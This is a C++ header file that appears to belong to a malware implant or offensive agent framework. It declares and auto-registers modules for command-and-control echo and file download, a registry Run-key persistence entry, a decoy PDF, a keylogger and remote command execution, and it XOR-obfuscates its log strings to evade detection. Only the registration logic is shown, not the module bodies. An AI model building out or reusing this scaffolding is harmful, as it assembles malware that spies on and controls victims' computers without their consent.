#pragma once
#include "module_registry.hpp"
#include <al/import.hpp>

DWORD RegisterModule_MessageBoxA(sh_context* ctx, uint32_t module_id);       // 0x1001
DWORD RegisterModule_Echo_C2(sh_context* ctx, uint32_t module_id);           // 0x9009
DWORD RegisterModule_C2DownloadFile(sh_context* ctx, uint32_t module_id);    // 0x1003
DWORD RegisterModule_CreateRegistryRunKey(sh_context* ctx, uint32_t module_id);     // 0x1002
DWORD RegisterModule_DecoyPDF(sh_context* ctx, uint32_t module_id);          // 0x1100
DWORD RegisterModule_Keylogger(sh_context* ctx, uint32_t module_id);     // 0x1004
DWORD RegisterModule_ExecuteCommand(sh_context* ctx, uint32_t module_id);          // 0x1000


DWORD AutoRegisterModules(sh_context* ctx) {
    module_descriptor_t modules[] = {
        {RegisterModule_Echo_C2, 0x9009},
        {RegisterModule_MessageBoxA, 0x1001},
        {RegisterModule_C2DownloadFile, 0x1003},
        {RegisterModule_CreateRegistryRunKey, 0x1002},
        {RegisterModule_DecoyPDF, 0x1100},
        {RegisterModule_ExecuteCommand, 0x1000},
        {RegisterModule_Keylogger, 0x1004},
    };
    size_t count = sizeof(modules) / sizeof(modules[0]);
    for (size_t i = 0; i < count; i++) {
        DWORD result = modules[i].func(ctx, modules[i].module_id);
        if (result != ERROR_SUCCESS) {
            AesLogger::LogError(ctx->log_ctx, "Failed to auto register module %x. Error code: %d"_xor, modules[i].module_id, result);
            return FAIL_AUTO_REGISTER_MODULES;
        } else {
            AesLogger::LogSuccess(ctx->log_ctx, "Successfully auto registered module 0x%x."_xor, modules[i].module_id);
        }
    }
    return ERROR_SUCCESS;
}
